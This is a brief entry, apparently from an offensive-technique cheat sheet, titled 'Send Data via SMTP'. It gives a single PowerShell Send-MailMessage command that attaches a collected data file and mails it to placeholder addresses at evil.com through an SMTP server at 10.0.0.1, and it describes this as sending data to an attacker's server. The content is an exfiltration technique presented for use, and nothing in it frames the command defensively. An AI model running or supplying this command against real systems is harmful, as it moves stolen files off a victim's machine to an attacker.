# Send Data via SMTP

This command sends a mail attached a collected data file to an attacker's server.

```powershell
Send-MailMessage -From sender@evil.com -To recipient@evil.com -Subject "Hello" -Attachments C:\data.txt -SmtpServer 10.0.0.1
```
